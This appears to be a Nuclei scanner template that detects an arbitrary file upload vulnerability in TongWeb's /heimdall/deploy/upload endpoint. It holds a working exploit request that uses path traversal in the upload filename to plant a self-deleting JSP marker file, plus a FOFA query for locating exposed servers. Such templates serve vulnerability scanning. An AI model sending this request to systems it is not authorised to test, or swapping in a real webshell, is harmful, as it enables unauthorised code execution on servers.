id: tongweb-deploy-fileupload
info:
  name: 东方通 /heimdall/deploy/upload - fileupload
  author: leadlife
  severity: critical
  description: 东方通upload接口存在任意文件上传漏洞，允许攻击者上传恶意文件到服务器，可能导致远程代码执行、网站篡改或其他形式的攻击，严重威胁系统和数据安全。
  reference: 
    - https://github.com/wy876/POC/blob/main/%E4%B8%9C%E6%96%B9%E9%80%9A/%E4%B8%9C%E6%96%B9%E9%80%9Aupload%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
  metadata:
    verified: false
    max-request: 1
    fofa-query: 'header="TongWeb Server" || banner="Server: TongWeb Server"'
    hunter-query: demo
  tags: tongweb,fileupload

http:
  - raw:
      - |
        POST /heimdall/deploy/upload?method=upload HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36
        Connection: keep-alive
        Content-Length: 396
        Accept: */*
        Accept-Encoding: gzip, deflate, br
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary8UaANmWAgM4BqBSs

        ------WebKitFormBoundary8UaANmWAgM4BqBSsContent-Disposition: form-data; name="file"; filename="../../applications/console/css/12462332j12.jsp"

        <%out.print("{{randstr}}");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
        ------WebKitFormBoundary8UaANmWAgM4BqBSs--
                
      - |+
        GET /console/css/12462332j12.jsp HTTP/1.1
        Host: {{Hostname}}
        
    matchers:
      - type: dsl
        dsl:
          - status_code_1 == 200 && status_code_2 == 200
          - contains(body_2,'{{randstr}}')
        condition: and